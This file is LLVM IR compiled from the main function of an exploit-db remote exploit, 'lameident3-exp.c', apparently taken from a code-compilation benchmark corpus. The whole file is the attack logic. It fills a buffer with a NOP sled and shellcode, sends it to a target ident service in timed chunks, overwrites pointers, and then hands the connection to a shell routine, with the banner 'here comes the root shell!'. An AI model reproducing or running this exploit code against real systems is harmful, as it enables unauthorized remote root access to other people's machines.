; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21663.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_21663.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i64, i8*, i8* }
%struct.in_addr = type { i32 }

@USLEEP = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [35 x i8] c"lameident3-exp.c by sloth @ b0red\0A\00", align 1
@.str.1 = private unnamed_addr constant [60 x i8] c"usage: ./lameident3-exp <target> <host> <send delay in ms>\0A\00", align 1
@target = common dso_local global %struct.TYPE_2__* null, align 8
@.str.2 = private unnamed_addr constant [12 x i8] c"  %d: %x %s\00", align 1
@.str.3 = private unnamed_addr constant [15 x i8] c"invalid target\00", align 1
@.str.4 = private unnamed_addr constant [13 x i8] c"invalid host\00", align 1
@.str.5 = private unnamed_addr constant [20 x i8] c"AAAAAAAAAAAAAAAAAAA\00", align 1
@.str.6 = private unnamed_addr constant [40 x i8] c"Writing shellcode: %d bytes to 0x%x...\0A\00", align 1
@.str.7 = private unnamed_addr constant [12 x i8] c"write error\00", align 1
@.str.8 = private unnamed_addr constant [26 x i8] c"Writing pointers to 0x%x\0A\00", align 1
@ALIGN = common dso_local global i64 0, align 8
@.str.9 = private unnamed_addr constant [12 x i8] c"1234, 1234\0A\00", align 1
@.str.10 = private unnamed_addr constant [28 x i8] c"here comes the root shell!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca [2020 x i8], align 16
  %14 = alloca [32 x i8], align 16
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca %struct.in_addr, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %18 = load i32, i32* @USLEEP, align 4
  store i32 %18, i32* %8, align 4
  store i32 500, i32* %9, align 4
  store i64 3221201040, i64* %11, align 8
  store i64 0, i64* %12, align 8
  %19 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0))
  %20 = load i32, i32* %4, align 4
  %21 = icmp slt i32 %20, 3
  br i1 %21, label %22, label %52

22:                                               ; preds = %2
  %23 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.1, i64 0, i64 0))
  store i32 0, i32* %7, align 4
  br label %24

24:                                               ; preds = %47, %22
  %25 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %26 = load i32, i32* %7, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %25, i64 %27
  %29 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %28, i32 0, i32 0
  %30 = load i64, i64* %29, align 8
  %31 = icmp ne i64 %30, 0
  br i1 %31, label %32, label %50

32:                                               ; preds = %24
  %33 = load i32, i32* %7, align 4
  %34 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %35 = load i32, i32* %7, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i64 %36
  %38 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %37, i32 0, i32 0
  %39 = load i64, i64* %38, align 8
  %40 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %41 = load i32, i32* %7, align 4
  %42 = sext i32 %41 to i64
  %43 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %40, i64 %42
  %44 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %43, i32 0, i32 1
  %45 = load i8*, i8** %44, align 8
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0), i32 %33, i64 %39, i8* %45)
  br label %47

47:                                               ; preds = %32
  %48 = load i32, i32* %7, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %7, align 4
  br label %24

50:                                               ; preds = %24
  %51 = call i32 @exit(i32 -1) #3
  unreachable

52:                                               ; preds = %2
  store i32 0, i32* %7, align 4
  br label %53

53:                                               ; preds = %71, %52
  %54 = load i32, i32* %7, align 4
  %55 = load i8**, i8*** %5, align 8
  %56 = getelementptr inbounds i8*, i8** %55, i64 1
  %57 = load i8*, i8** %56, align 8
  %58 = call i32 @atoi(i8* %57)
  %59 = icmp slt i32 %54, %58
  br i1 %59, label %60, label %74

60:                                               ; preds = %53
  %61 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %62 = load i32, i32* %7, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %61, i64 %63
  %65 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %64, i32 0, i32 0
  %66 = load i64, i64* %65, align 8
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %70, label %68

68:                                               ; preds = %60
  %69 = call i32 @fail(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.3, i64 0, i64 0))
  br label %70

70:                                               ; preds = %68, %60
  br label %71

71:                                               ; preds = %70
  %72 = load i32, i32* %7, align 4
  %73 = add nsw i32 %72, 1
  store i32 %73, i32* %7, align 4
  br label %53

74:                                               ; preds = %53
  %75 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %76 = load i32, i32* %7, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %75, i64 %77
  %79 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %78, i32 0, i32 0
  %80 = load i64, i64* %79, align 8
  store i64 %80, i64* %10, align 8
  %81 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %82 = load i32, i32* %7, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %81, i64 %83
  %85 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %84, i32 0, i32 2
  %86 = load i8*, i8** %85, align 8
  store i8* %86, i8** %16, align 8
  %87 = load i8**, i8*** %5, align 8
  %88 = getelementptr inbounds i8*, i8** %87, i64 3
  %89 = load i8*, i8** %88, align 8
  %90 = icmp ne i8* %89, null
  br i1 %90, label %91, label %96

91:                                               ; preds = %74
  %92 = load i8**, i8*** %5, align 8
  %93 = getelementptr inbounds i8*, i8** %92, i64 3
  %94 = load i8*, i8** %93, align 8
  %95 = call i32 @atoi(i8* %94)
  store i32 %95, i32* %8, align 4
  br label %96

96:                                               ; preds = %91, %74
  %97 = load i8**, i8*** %5, align 8
  %98 = getelementptr inbounds i8*, i8** %97, i64 2
  %99 = load i8*, i8** %98, align 8
  %100 = call i32 @resolve(i8* %99)
  %101 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  store i32 %100, i32* %101, align 4
  %102 = icmp eq i32 %100, -1
  br i1 %102, label %103, label %105

103:                                              ; preds = %96
  %104 = call i32 @fail(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.4, i64 0, i64 0))
  br label %105

105:                                              ; preds = %103, %96
  %106 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  %107 = call i32 @memset(i8* %106, i32 0, i32 2020)
  %108 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  %109 = load i8*, i8** %16, align 8
  %110 = call i32 @strlen(i8* %109)
  %111 = sext i32 %110 to i64
  %112 = sub i64 2020, %111
  %113 = sub i64 %112, 1
  %114 = trunc i64 %113 to i32
  %115 = call i32 @memset(i8* %108, i32 144, i32 %114)
  %116 = load i8*, i8** %16, align 8
  %117 = call i32 @strlen(i8* %116)
  %118 = sext i32 %117 to i64
  %119 = sub i64 2020, %118
  %120 = sub i64 %119, 1
  %121 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 %120
  %122 = load i8*, i8** %16, align 8
  %123 = load i8*, i8** %16, align 8
  %124 = call i32 @strlen(i8* %123)
  %125 = call i32 @memcpy(i8* %121, i8* %122, i32 %124)
  %126 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %127 = load i32, i32* %126, align 4
  %128 = call i32 @make_connect(i32 %127)
  store i32 %128, i32* %6, align 4
  %129 = load i32, i32* %6, align 4
  %130 = call i32 @send(i32 %129, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i32 19, i32 0)
  %131 = load i32, i32* %8, align 4
  %132 = call i32 @usleep(i32 %131)
  %133 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %134 = call i32 @memset(i8* %133, i32 0, i32 32)
  %135 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  store i8 65, i8* %135, align 16
  %136 = load i64, i64* %11, align 8
  %137 = load i64, i64* %10, align 8
  %138 = sub nsw i64 %136, %137
  %139 = sub nsw i64 %138, 5
  %140 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 1
  %141 = bitcast i8* %140 to i64*
  store i64 %139, i64* %141, align 1
  %142 = load i32, i32* %6, align 4
  %143 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %144 = call i32 @send(i32 %142, i8* %143, i32 5, i32 0)
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @usleep(i32 %145)
  %147 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  store i8* %147, i8** %15, align 8
  %148 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  %149 = call i32 @strlen(i8* %148)
  %150 = load i64, i64* %11, align 8
  %151 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.6, i64 0, i64 0), i32 %149, i64 %150)
  store i32 0, i32* %7, align 4
  br label %152

152:                                              ; preds = %177, %105
  %153 = load i32, i32* %7, align 4
  %154 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  %155 = call i32 @strlen(i8* %154)
  %156 = icmp sle i32 %153, %155
  %157 = zext i1 %156 to i32
  %158 = load i8*, i8** %15, align 8
  %159 = load i8, i8* %158, align 1
  %160 = icmp ne i8 %159, 0
  br i1 %160, label %161, label %184

161:                                              ; preds = %152
  %162 = load i32, i32* %6, align 4
  %163 = load i8*, i8** %15, align 8
  %164 = load i8*, i8** %15, align 8
  %165 = call i32 @strlen(i8* %164)
  %166 = icmp sgt i32 %165, 19
  br i1 %166, label %167, label %168

167:                                              ; preds = %161
  br label %171

168:                                              ; preds = %161
  %169 = load i8*, i8** %15, align 8
  %170 = call i32 @strlen(i8* %169)
  br label %171

171:                                              ; preds = %168, %167
  %172 = phi i32 [ 19, %167 ], [ %170, %168 ]
  %173 = call i32 @send(i32 %162, i8* %163, i32 %172, i32 0)
  store i32 %173, i32* %7, align 4
  %174 = icmp eq i32 %173, -1
  br i1 %174, label %175, label %177

175:                                              ; preds = %171
  %176 = call i32 @fail(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  br label %177

177:                                              ; preds = %175, %171
  %178 = load i32, i32* %7, align 4
  %179 = load i8*, i8** %15, align 8
  %180 = sext i32 %178 to i64
  %181 = getelementptr inbounds i8, i8* %179, i64 %180
  store i8* %181, i8** %15, align 8
  %182 = load i32, i32* %8, align 4
  %183 = call i32 @usleep(i32 %182)
  br label %152

184:                                              ; preds = %152
  %185 = load i32, i32* %6, align 4
  %186 = call i32 @close(i32 %185)
  %187 = call i32 @usleep(i32 100)
  %188 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %189 = load i32, i32* %188, align 4
  %190 = call i32 @make_connect(i32 %189)
  store i32 %190, i32* %6, align 4
  %191 = load i32, i32* %6, align 4
  %192 = call i32 @send(i32 %191, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i32 19, i32 0)
  %193 = load i32, i32* %8, align 4
  %194 = call i32 @usleep(i32 %193)
  %195 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %196 = call i32 @memset(i8* %195, i32 0, i32 32)
  %197 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  store i8 65, i8* %197, align 16
  %198 = load i64, i64* %11, align 8
  %199 = load i64, i64* %10, align 8
  %200 = sub nsw i64 %198, %199
  %201 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  %202 = call i32 @strlen(i8* %201)
  %203 = sext i32 %202 to i64
  %204 = add nsw i64 %200, %203
  %205 = add nsw i64 %204, 20
  %206 = sub nsw i64 %205, 5
  %207 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 1
  %208 = bitcast i8* %207 to i64*
  store i64 %206, i64* %208, align 1
  %209 = load i32, i32* %6, align 4
  %210 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %211 = call i32 @send(i32 %209, i8* %210, i32 5, i32 0)
  %212 = load i32, i32* %8, align 4
  %213 = call i32 @usleep(i32 %212)
  %214 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  store i8* %214, i8** %15, align 8
  %215 = load i64, i64* %11, align 8
  %216 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  %217 = call i32 @strlen(i8* %216)
  %218 = sext i32 %217 to i64
  %219 = add nsw i64 %215, %218
  %220 = add nsw i64 %219, 20
  store i64 %220, i64* %12, align 8
  %221 = load i64, i64* %12, align 8
  %222 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.8, i64 0, i64 0), i64 %221)
  %223 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  %224 = call i32 @memset(i8* %223, i32 0, i32 2020)
  store i32 0, i32* %7, align 4
  br label %225

225:                                              ; preds = %235, %184
  %226 = load i32, i32* %7, align 4
  %227 = icmp sle i32 %226, 512
  br i1 %227, label %228, label %238

228:                                              ; preds = %225
  %229 = load i64, i64* %11, align 8
  %230 = add nsw i64 %229, 500
  %231 = load i32, i32* %7, align 4
  %232 = sext i32 %231 to i64
  %233 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 %232
  %234 = bitcast i8* %233 to i64*
  store i64 %230, i64* %234, align 1
  br label %235

235:                                              ; preds = %228
  %236 = load i32, i32* %7, align 4
  %237 = add nsw i32 %236, 4
  store i32 %237, i32* %7, align 4
  br label %225

238:                                              ; preds = %225
  store i32 0, i32* %7, align 4
  br label %239

239:                                              ; preds = %264, %238
  %240 = load i32, i32* %7, align 4
  %241 = getelementptr inbounds [2020 x i8], [2020 x i8]* %13, i64 0, i64 0
  %242 = call i32 @strlen(i8* %241)
  %243 = icmp sle i32 %240, %242
  %244 = zext i1 %243 to i32
  %245 = load i8*, i8** %15, align 8
  %246 = load i8, i8* %245, align 1
  %247 = icmp ne i8 %246, 0
  br i1 %247, label %248, label %271

248:                                              ; preds = %239
  %249 = load i32, i32* %6, align 4
  %250 = load i8*, i8** %15, align 8
  %251 = load i8*, i8** %15, align 8
  %252 = call i32 @strlen(i8* %251)
  %253 = icmp sgt i32 %252, 19
  br i1 %253, label %254, label %255

254:                                              ; preds = %248
  br label %258

255:                                              ; preds = %248
  %256 = load i8*, i8** %15, align 8
  %257 = call i32 @strlen(i8* %256)
  br label %258

258:                                              ; preds = %255, %254
  %259 = phi i32 [ 19, %254 ], [ %257, %255 ]
  %260 = call i32 @send(i32 %249, i8* %250, i32 %259, i32 0)
  store i32 %260, i32* %7, align 4
  %261 = icmp eq i32 %260, -1
  br i1 %261, label %262, label %264

262:                                              ; preds = %258
  %263 = call i32 @fail(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.7, i64 0, i64 0))
  br label %264

264:                                              ; preds = %262, %258
  %265 = load i32, i32* %7, align 4
  %266 = load i8*, i8** %15, align 8
  %267 = sext i32 %265 to i64
  %268 = getelementptr inbounds i8, i8* %266, i64 %267
  store i8* %268, i8** %15, align 8
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @usleep(i32 %269)
  br label %239

271:                                              ; preds = %239
  %272 = load i32, i32* %6, align 4
  %273 = call i32 @close(i32 %272)
  %274 = load i32, i32* %8, align 4
  %275 = call i32 @usleep(i32 %274)
  %276 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %277 = load i32, i32* %276, align 4
  %278 = call i32 @make_connect(i32 %277)
  store i32 %278, i32* %6, align 4
  %279 = load i32, i32* %6, align 4
  %280 = call i32 @send(i32 %279, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.5, i64 0, i64 0), i32 19, i32 0)
  %281 = load i32, i32* %8, align 4
  %282 = call i32 @usleep(i32 %281)
  %283 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %284 = call i32 @memset(i8* %283, i32 0, i32 32)
  %285 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  store i8 65, i8* %285, align 16
  %286 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 1
  %287 = bitcast i8* %286 to i64*
  store i64 4294967131, i64* %287, align 1
  %288 = load i32, i32* %6, align 4
  %289 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %290 = call i32 @send(i32 %288, i8* %289, i32 5, i32 0)
  %291 = load i32, i32* %8, align 4
  %292 = call i32 @usleep(i32 %291)
  %293 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %294 = call i32 @memset(i8* %293, i32 0, i32 32)
  %295 = load i64, i64* %12, align 8
  %296 = add nsw i64 %295, 200
  %297 = load i64, i64* @ALIGN, align 8
  %298 = add nsw i64 %296, %297
  %299 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %300 = bitcast i8* %299 to i64*
  store i64 %298, i64* %300, align 16
  %301 = load i32, i32* %6, align 4
  %302 = getelementptr inbounds [32 x i8], [32 x i8]* %14, i64 0, i64 0
  %303 = call i32 @send(i32 %301, i8* %302, i32 4, i32 0)
  %304 = load i32, i32* %6, align 4
  %305 = call i32 @close(i32 %304)
  %306 = load i32, i32* %8, align 4
  %307 = call i32 @usleep(i32 %306)
  %308 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %17, i32 0, i32 0
  %309 = load i32, i32* %308, align 4
  %310 = call i32 @make_connect(i32 %309)
  store i32 %310, i32* %6, align 4
  %311 = load i32, i32* %6, align 4
  %312 = call i32 @send(i32 %311, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0), i32 11, i32 0)
  %313 = load i32, i32* %8, align 4
  %314 = call i32 @usleep(i32 %313)
  %315 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.10, i64 0, i64 0))
  %316 = load i32, i32* %6, align 4
  %317 = call i32 @sh(i32 %316)
  %318 = load i32, i32* %6, align 4
  %319 = call i32 @close(i32 %318)
  %320 = load i32, i32* %3, align 4
  ret i32 %320
}

declare dso_local i32 @printf(i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @atoi(i8*) #1

declare dso_local i32 @fail(i8*) #1

declare dso_local i32 @resolve(i8*) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @make_connect(i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @usleep(i32) #1

declare dso_local i32 @close(i32) #1

declare dso_local i32 @sh(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
